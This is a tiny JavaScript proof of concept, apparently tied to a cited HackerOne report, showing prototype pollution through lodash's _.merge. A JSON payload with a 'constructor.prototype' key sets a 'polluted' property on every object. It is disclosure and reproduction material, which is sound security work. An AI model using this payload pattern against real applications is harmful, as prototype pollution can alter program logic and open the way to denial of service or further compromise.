//https://hackerone.com/reports/380873
 
  const _ = require("lodash");
  let payload = JSON.parse(
    '{"constructor": {"prototype": {"polluted": "yes"}}}'
  );
   
  _.merge({}, payload);
// End of file
